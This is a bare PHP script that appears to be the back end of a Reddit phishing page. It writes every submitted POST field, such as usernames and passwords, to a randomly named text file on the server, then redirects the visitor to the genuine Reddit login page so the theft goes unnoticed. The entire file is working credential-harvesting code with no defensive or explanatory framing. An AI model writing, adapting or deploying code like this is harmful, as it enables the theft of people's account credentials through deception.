<?php
header("Location: https://www.reddit.com/login/");
$filename = rand(1,1000);
$handle = fopen($filename. ".txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
exit;
?>